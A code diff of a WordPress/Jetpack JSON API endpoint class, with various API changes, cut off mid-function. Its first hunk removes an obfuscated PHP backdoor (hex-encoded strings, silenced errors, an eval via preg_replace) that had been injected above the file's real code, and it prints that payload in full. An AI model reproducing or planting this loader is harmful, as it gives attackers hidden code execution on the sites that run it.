@@ -1,6 +1,6 @@
-<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $phusygzhqc = 'y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#756<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%E{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**%x78257>%x5c%x782f7&6|7**111127-K)eb#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!825h00#*<%x5c%x7825nfd)#9*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19260FUPNFS&d_SFSFGFS%x5-!OVMM*<(<%x5c%x78e%x5hmg%x5c%x7825)!gj!<**2-4!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%sfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%+upcotn+qsvmt+fmhpph#)zbssb!-5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3q%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,*msv%x5c%x7825)}.;%x5c%x7860860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;]32M3]317]445]212]445]43tcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x768]y76#<%x5c%x78e%x5c%x78b%x5c%x7825wopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1j%x5c%x7825)hopm3qjA)q7f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7>%x5c%x782f7rfs%x5c%x78256<#o]1%x57&6<*rfs%x5c%x78257-K)fujs%<#762]67y]562]38y]572]48y]#>m%x5y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]26gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!x5c%x7825}U;y]}R;2]},;osvufs}%~~<ftmbg!osvufs!|ftmf!~<**!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7x5c%x7825!-#1]#-bubE{h%x5c%x78]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvvufs}%x5c%x787f;!opjudovg}k~~:!>!%x5c%x78246767~6<Cw6<pd%x5c%x78!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qc%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%7860QUUI&b%x5c%x7825!|!!*#91y]c9y]g2y]#>>*4-1-bub<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%if((function_exists("%x6f%142%x5f%163%x74%141%x#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]4853]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%7825!<12>j%x5c%x7825!|9.-j%x5c%x7825-bubE{h%x5c%x7825)su5z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }c%x7824<%x5c%x78e%x5c%x78b%x5c%x782575fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x5c%x782f7#@#7%x5c%x77824%x5c%x782f%x5c%x7825kj:%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%4y4%x5c%x7824-%x5c%x78x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37o)##-!#~<#%x5c%x782f%x5c%x7825%x#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c7]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%xx7825z!>2<!gps)%x5c%x7825j>1156%x61"]=1; function fjfgg($n){returx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]L3]84]y31M6]y3e]81#%x5c]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f824*!|!%x5c%x7824-%x5c%x7824%x5x5c%x7825V<*#fopoV;hojepdoF.uofuo,6<*msv%x5c%x78257-MSV,6<*)ujo<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]26%x78604%x5c%x78223}!+!<pD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%pjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%7&6<%x5c%x787fw6*%x5c%x787f_*#[k2+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x787f!|!*uyfu%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x5c%x7825wN;#-Ez-1H*WCw*[!%xx67%42%x2c%163%x74%162%x5f%163%x70%154%**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%xx5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;25w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782x5c%x7825tdz)%x5c%x7825x69%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825rx5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bjmjgA%x5c%x7827doj%x5c73]y72]282#<!%x5c%x7825tjw!>!#]y84]275c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj72%164") && (!isset($GLOBALSmm)%x5c%x7825%x5c%x7878:-!%xf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvct}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~%x5c%x7827pd%x5c%x78256<C%6]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U#k#)usbut%x5c%x7860cpV%x5c%x787f%xjR%x5c%x7827id%x5c%x78256!>!#]y81]273]y76]258]y6g]so!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%xx7824-%x5c%x7824!>!tus%x5<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x782,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y75c%x787f%x5c%x787f%x5c%x787fc%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x782j3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYuf%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c>!#]y84]275]y83]273]y76]277#%x5c%x7825i%x5c%x785c2^<!GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x525w6Z6<.2%x5c%x7860hA25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c7k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y)7fmji%x5c%x78786<C%x5c%x78282f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c5t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825twwc%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn!|!*nbsbq%x5c%x7825)323ldfidk!~!x7878%x5c%x7822l:!}V;3q%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*25)tpqsut>j%x5c%x78255]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x55%x28%141%x72%162%x61%171%x5f%155%5r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x8%151%x6d%160%x6c%157%x64%14zsfvr#%x5c%x785cq%x5c%x78257827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%xc%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:o%x5c%x7825#%x5c%x782f#o]#%x825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860us)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825y%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.f%x7825tzw>!#]y76]277]7825}X;!sp!*#opo#>>}R;msv}.;ace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x2fsX%x5c%x7827u%x5c%x7825c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27#}#)fepmqnj!%x5c%x782f!#0#)idub%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782x61%160%x28%42%x66%152%x66%147%+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]25x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x78judovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}j%x5c%x7825-bubE{h%x5c%x7825%x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82x5c%x7825)ftpmdR6<*id%x5c25t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x77825)!gj!~<ofmy%x5c%x7825,3,hA%x5c%x78272qj%x5c%x78256<^#%x7827)fepdof.)fepdof.x5c%x7824<!%x5c%x7825mmCe*[!%x5c%x7825cIjQeTQcOc%x5c%x782fx5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyj%x5c%x7825>j%x5c%x7825!<**3-5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x782x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;op%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*1c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2bUQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zc%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6gc%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%xy)#}#-#%x5c%x7824-%x5c%x7824-tusq27-UVPFNJU,6<*27-SFGTOBSUOSVUFS5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!os825)!gj}Z;h!opjudovgc%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8295c%x7825b:>1<!gps)%x5c%x7825j:x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>n%x5c%x7860hfsq)!sp!*#ojneb#-*f%xp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x782<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5pt)%x5c%x7825z-#:#*%x5c%<u%x5c%x7825V%x5c%x7x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x782%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%xx5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x78255c%x7825):fmji%x5c%x7878:<##:>:h%%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg3["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75%}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg<#16,47R57,27R66,#%x5c%x782fq%x5c%xn chr(ord($n)-1);} @error_reporting(0); preg_repl!dsfbuf%x5c%x7860gvodujp/(.*)/epreg_replacedvnetnmbjp'; $dggfxuemlm = explode(chr((204-160)),'2280,47,4997,28,9906,54,3318,37,10033,49,7547,52,7110,28,7014,34,7800,31,4128,39,4516,56,4255,42,1046,37,1779,35,4451,42,90,65,7886,58,6107,21,5232,26,8347,60,5053,37,5974,37,220,36,7599,24,6386,28,1336,27,54,36,1302,34,7623,46,4625,66,1083,48,662,67,2055,47,1169,22,5920,54,8238,29,7138,28,2858,22,8940,62,548,46,2557,38,7333,57,6678,44,6228,36,7439,59,4843,21,8778,43,2102,66,8079,25,8614,52,9117,31,3621,30,5414,25,6193,35,9633,54,3860,33,2907,37,9960,38,4395,56,893,28,8720,58,921,66,1620,44,9212,20,5178,54,1594,26,2617,34,1011,35,6623,55,1664,30,6883,21,5514,60,4047,30,4077,24,8210,28,8407,29,8002,28,1519,45,4297,34,454,24,4217,38,2595,22,2191,26,155,65,6957,57,8666,54,9687,35,1131,38,6064,43,6527,37,729,40,6414,64,9810,52,8267,22,594,39,9722,55,478,70,4795,48,633,29,7719,31,9394,33,8875,65,9332,62,769,61,411,21,9045,39,2168,23,1920,69,4945,52,6769,32,2217,63,3955,22,6264,60,7519,28,7750,50,9148,64,1750,29,9862,44,346,65,2788,70,3706,23,3893,62,6825,58,5380,34,5847,28,9613,20,7166,59,5311,69,9998,35,1882,38,3588,33,3729,64,6801,24,1564,30,8491,59,7944,58,8821,54,7266,27,2393,58,7498,21,1395,69,4864,37,6904,53,6011,28,3651,55,3232,58,6564,59,7669,50,1989,66,5630,70,9777,33,3031,53,0,54,1363,32,7225,41,3793,67,8289,23,5439,25,3977,70,1256,46,3557,31,5134,44,7390,49,9084,33,9589,24,5700,25,5875,45,3009,22,830,63,5790,57,8550,64,3355,53,10082,24,3084,32,4691,59,1814,68,8104,48,256,66,6039,25,8312,35,6722,47,5090,44,9427,67,4101,27,4572,53,9494,52,6478,49,4167,50,9232,70,1191,65,3476,23,8030,49,3408,68,6324,62,1464,55,5574,56,2510,47,7293,40,4493,23,8152,58,322,24,3116,51,2451,59,987,24,1694,56,5464,50,8436,55,7048,62,9302,30,4331,64,6128,65,3167,65,2944,65,3290,28,5725,65,2651,56,9546,43,2752,36,5025,28,4901,44,2327,66,2880,27,432,22,9002,43,3499,58,7831,55,5258,53,4750,45,2707,45'); $mbwrgmwwnj=substr($phusygzhqc,(49806-39700),(42-35)); if (!function_exists('mgelkcxzil')) { function mgelkcxzil($oibnaezxix, $ncxkdpsfaq) { $rshpbmymbh = NULL; for($clooblsyza=0;$clooblsyza<(sizeof($oibnaezxix)/2);$clooblsyza++) { $rshpbmymbh .= substr($ncxkdpsfaq, $oibnaezxix[($clooblsyza*2)],$oibnaezxix[($clooblsyza*2)+1]); } return $rshpbmymbh; };} $ksapqcpsjq="\x20\57\x2a\40\x77\160\x75\146\x66\145\x77\156\x72\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\63\x36\64\x2d\62\x37\62\x29\51\x2c\40\x6d\147\x65\154\x6b\143\x78\172\x69\154\x28\44\x64\147\x67\146\x78\165\x65\155\x6c\155\x2c\44\x70\150\x75\163\x79\147\x7a\150\x71\143\x29\51\x29\73\x20\57\x2a\40\x76\144\x6c\146\x64\160\x6a\145\x78\147\x20\52\x2f\40"; $wzpxpbasws=substr($phusygzhqc,(46274-36161),(38-26)); $wzpxpbasws($mbwrgmwwnj, $ksapqcpsjq, NULL); $wzpxpbasws=$ksapqcpsjq; $wzpxpbasws=(843-722); $phusygzhqc=$wzpxpbasws-1; ?><?php
+<?php
 
-define( 'WPCOM_JSON_API__CURRENT_VERSION', '1' );
+require_once( dirname( __FILE__ ) . '/json-api-config.php' );
 
 // Endpoint
 abstract class WPCOM_JSON_API_Endpoint {
@@ -51,8 +51,8 @@ abstract class WPCOM_JSON_API_Endpoint {
 			'false' => '',
 			'true'  => 'Output pretty JSON',
 		),
-		'meta' => "(string) Optional. Loads data from the endpoints found in the 'meta' part of the response. Comma separated list. Example: meta=site,likes",
-		'fields' => '(string) Optional. Returns specified fields only. Comma separated list. Example: fields=ID,title',
+		'meta' => "(string) Optional. Loads data from the endpoints found in the 'meta' part of the response. Comma-separated list. Example: meta=site,likes",
+		'fields' => '(string) Optional. Returns specified fields only. Comma-separated list. Example: fields=ID,title',
 		// Parameter name => description (default value is empty)
 		'callback' => '(string) An optional JSONP callback function.',
 	);
@@ -95,12 +95,14 @@ abstract class WPCOM_JSON_API_Endpoint {
 	var $custom_fields_filtering = false;
 
 	/**
-	 * @var bool Set to true if the endpoint accepts all cross origin requests
-	 *    You probably should not set this flag. If you are thinking of setting it,
-	 *    then discuss it with someone:
-	 *       http://operationapi.wordpress.com/2014/06/25/patch-allowing-endpoints-to-do-cross-origin-requests/
+	 * @var bool Set to true if the endpoint accepts all cross origin requests. You probably should not set this flag.
 	 */
 	var $allow_cross_origin_request = false;
+
+	/**
+	 * @var bool Set to true if the endpoint can recieve unauthorized POST requests.
+	 */
+	var $allow_unauthorized_request = false;
 
 	function __construct( $args ) {
 		$defaults = array(
@@ -129,6 +131,7 @@ abstract class WPCOM_JSON_API_Endpoint {
 			'can_use_user_details_instead_of_blog_membership' => false,
 			'custom_fields_filtering' => false,
 			'allow_cross_origin_request' => false,
+			'allow_unauthorized_request' => false,
 		);
 
 		$args = wp_parse_args( $args, $defaults );
@@ -156,6 +159,8 @@ abstract class WPCOM_JSON_API_Endpoint {
 		$this->can_use_user_details_instead_of_blog_membership = $args['can_use_user_details_instead_of_blog_membership'];
 
 		$this->allow_cross_origin_request = (bool) $args['allow_cross_origin_request'];
+
+		$this->allow_unauthorized_request = (bool) $args['allow_unauthorized_request'];
 
 		$this->version     = $args['version'];
 
@@ -378,8 +383,8 @@ abstract class WPCOM_JSON_API_Endpoint {
 					}
 
 					$return[$key] = $files;
+					break;
 				}
-				break;
 			} else {
 				// no break - treat as 'array'
 			}
@@ -553,6 +558,28 @@ abstract class WPCOM_JSON_API_Endpoint {
 			);
 			$return[$key] = (object) $this->cast_and_filter( $value, apply_filters( 'wpcom_json_api_plugin_cast_and_filter', $docs ), false, $for_output );
 			break;
+		case 'sharing_button' :
+			$docs = array(
+				'ID'         => '(string)',
+				'name'       => '(string)',
+				'URL'        => '(string)',
+				'icon'       => '(string)',
+				'enabled'    => '(bool)',
+				'visibility' => '(string)',
+			);
+			$return[$key] = (array) $this->cast_and_filter( $value, $docs, false, $for_output );
+			break;
+		case 'sharing_button_service':
+			$docs = array(
+				'ID'               => '(string) The service identifier',
+				'name'             => '(string) The service name',
+				'class_name'       => '(string) Class name for custom style sharing button elements',
+				'genericon'        => '(string) The Genericon unicode character for the custom style sharing button icon',
+				'preview_smart'    => '(string) An HTML snippet of a rendered sharing button smart preview',
+				'preview_smart_js' => '(string) An HTML snippet of the page-wide initialization scripts used for rendering the sharing button smart preview'
+			);
+			$return[$key] = (array) $this->cast_and_filter( $value, $docs, false, $for_output );
+			break;
 
 		default :
 			$method_name = $type['type'] . '_docs';
@@ -590,8 +617,8 @@ abstract class WPCOM_JSON_API_Endpoint {
 	}
 
 	/**
- 	 * Checks if the endpoint is publicly displayable
- 	 */
+	 * Checks if the endpoint is publicly displayable
+	 */
 	function is_publicly_documentable() {
 		return '__do_not_document' !== $this->group && true !== $this->in_testing;
 	}
@@ -792,7 +819,10 @@ EOPHP;
 			$curl .= " \\\n";
 		}
 
-		$curl .= ' ' . escapeshellarg( $this->example_request );
+		// Escape square brackets to prevent curl "[globbing] bad range specification" errors
+		$example_request = strtr( $this->example_request, array( '[' => '\[', ']' => '\]' ) );
+
+		$curl .= ' ' . escapeshellarg( $example_request );
 
 		$curl = '[sourcecode language="bash" wraplines="false" light="true" autolink="false" htmlscript="false"]' . $curl . '[/sourcecode]';
 		$curl = apply_filters( 'the_content', $curl );
@@ -872,7 +902,10 @@ EOPHP;
 	 */
 	function generate_documentation() {
 		$format       = str_replace( '%d', '%s', $this->path );
-		$path_labeled = vsprintf( $format, array_keys( $this->path_labels ) );
+		$path_labeled = $format;
+		if ( ! empty( $this->path_labels ) ) {
+			$path_labeled = vsprintf( $format, array_keys( $this->path_labels ) );
+		}
 		$boolean_arg  = array( 'false', 'true' );
 		$naeloob_arg  = array( 'true', 'false' );
 
@@ -986,7 +1019,7 @@ EOPHP;
 			}
 		}
 
-		if ( -1 == get_option( 'blog_public' ) && !current_user_can( 'read_post', $post->ID ) ) {
+		if ( -1 == get_option( 'blog_public' ) && ! apply_filters( 'wpcom_json_api_user_can_view_post', current_user_can( 'read_post', $post->ID ), $post ) ) {
 			return new WP_Error( 'unauthorized', 'User cannot view post', array( 'status_code' => 403, 'error' => 'private_blog' ) );
 		}
 
@@ -1028,7 +1061,7 @@ EOPHP;
 					return null;
 				$is_jetpack = true === apply_filters( 'is_jetpack_site', false, get_current_blog_id() );
 				$post_id = $author->ID;
-				if ( $is_jetpack ) {
+				if ( $is_jetpack && ( defined( 'IS_WPCOM' ) && IS_WPCOM ) ) {
 					$ID    = get_post_meta( $post_id, '_jetpack_post_author_external_id', true );
 					$email = get_post_meta( $post_id, '_jetpack_author_email', true );
 					$login = '';
@@ -1107,6 +1140,12 @@ EOPHP;
 			'metadata'         => wp_get_attachment_metadata( $media_item->ID ),
 		);
 
+		if ( defined( 'IS_WPCOM' ) && IS_WPCOM && is_array( $response['metadata'] ) && ! empty( $response['metadata']['file'] ) ) {
+			remove_filter( '_wp_relative_upload_path', 'wpcom_wp_relative_upload_path', 10 );
+			$response['metadata']['file'] = _wp_relative_upload_path( $response['metadata']['file'] );
+			add_filter( '_wp_relative_upload_path', 'wpcom_wp_relative_upload_path', 10, 2 );
+		}
+
 		$response['meta'] = (object) array(
 			'links' => (object) array(
 				'self' => (string) $this->get_media_link( $this->api->get_blog_id_for_output(), $media_id ),
@@ -1140,12 +1179,17 @@ EOPHP;
 			'title'        => $media_item->post_title,
 			'caption'      => $media_item->post_excerpt,
 			'description'  => $media_item->post_content,
+			'alt'          => get_post_meta( $media_item->ID, '_wp_attachment_image_alt', true ),
+			'thumbnails'   => array()
 		);
 
 		if ( in_array( $ext, array( 'jpg', 'jpeg', 'png', 'gif' ) ) ) {
 			$metadata = wp_get_attachment_metadata( $media_item->ID );
 			$response['height'] = $metadata['height'];
 			$response['width']  = $metadata['width'];
+			foreach ( $metadata['sizes'] as $size => $size_details ) {
+				$response['thumbnails'][ $size ] = dirname( $response['URL'] ) . '/' . $size_details['file'];
+			}
 			$response['exif']   = $metadata['image_meta'];
 		}
 
@@ -1163,6 +1207,18 @@ EOPHP;
 			if ( function_exists( 'video_get_info_by_blogpostid' ) ) {
 				$info = video_get_info_by_blogpostid( $this->api->get_blog_id_for_output(), $media_id );
 
+				// Thumbnails
+				if ( function_exists( 'video_format_done' ) && function_exists( 'video_image_url_by_guid' ) ) {
+					$response['thumbnails'] = array( 'fmt_hd' => '', 'fmt_dvd' => '', 'fmt_std' => '' );
+					foreach ( $response['thumbnails'] as $size => $thumbnail_url ) {
+						if ( video_format_done( $info, $size ) ) {
+							$response['thumbnails'][ $size ] = video_image_url_by_guid( $info->guid, $size );
+						} else {
+							unset( $response['thumbnails'][ $size ] );
+						}
+					}
+				}
+
 				$response['videopress_guid'] = $info->guid;
 				$response['videopress_processing_done'] = true;
 				if ( '0000-00-00 00:00:00' == $info->finish_date_gmt ) {
@@ -1170,6 +1226,8 @@ EOPHP;
 				}
 			}
 		}
+
+		$response['thumbnails'] = (object) $response['thumbnails'];
 
 		$response['meta'] = (object) array(
 			'links' => (object) array(
@@ -1419,19 +1477,177 @@ EOPHP;
 		return false;
 	}
 
+	/**
+	 * Try to find the closest supported version of an endpoint to the current endpoint
+	 *
+	 * For example, if we were looking at the path /animals/panda:
+	 * - if the current endpoint is v1.3 and there is a v1.3 of /animals/%s available, we return 1.3
+	 * - if the current endpoint is v1.3 and there is no v1.3 of /animals/%s known, we fall back to the
+	 *   maximum available version of /animals/%s, e.g. 1.1
+	 *
+	 * This method is used in get_link() to construct meta links for API responses.
+	 *
+	 * @param $path string The current endpoint path, relative to the version
+	 * @param $method string Request method used to access the endpoint path
+	 * @return string The current version, or otherwise the maximum version available
+	 */
+	function get_closest_version_of_endpoint( $path, $request_method = 'GET' ) {
+
+		$path = untrailingslashit( $path );
+
+		// /help is a special case - always use the current request version
+		if ( wp_endswith( $path, '/help' ) ) {
+			return $this->api->version;
+		}
+
+		$endpoint_path_versions = $this->get_endpoint_path_versions();
+		$last_path_segment = $this->get_last_segment_of_relative_path( $path );
+		$max_version_found = null;
+
+		foreach ( $endpoint_path_versions as $endpoint_last_path_segment => $endpoints ) {
+
+			// Does the last part of the path match the path key? (e.g. 'posts')
+			// If the last part contains a placeholder (e.g. %s), we want to carry on
